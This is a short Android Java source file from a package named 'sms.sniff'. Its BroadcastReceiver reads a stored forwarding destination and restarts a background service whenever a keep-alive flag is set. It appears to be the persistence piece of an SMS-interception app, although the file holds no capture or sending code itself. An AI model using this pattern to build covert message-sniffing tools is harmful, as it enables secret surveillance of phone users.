package sms.sniff;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

public class Initializer extends BroadcastReceiver{

	@Override
	public void onReceive(Context context, Intent intent) {
		
		SharedPreferences prefs = context.getSharedPreferences(Constants.sharedPreferences_Filename, 0);
		
		boolean keepAlive = prefs.getBoolean(Constants.sharedPreferences_keepAlive, true);
		Constants.destination = prefs.getString(Constants.sharedPreferences_destination, "");
		
		if(keepAlive) {
			context.startService(new Intent(context, DynamicRegisterService.class));
		}
	}
}
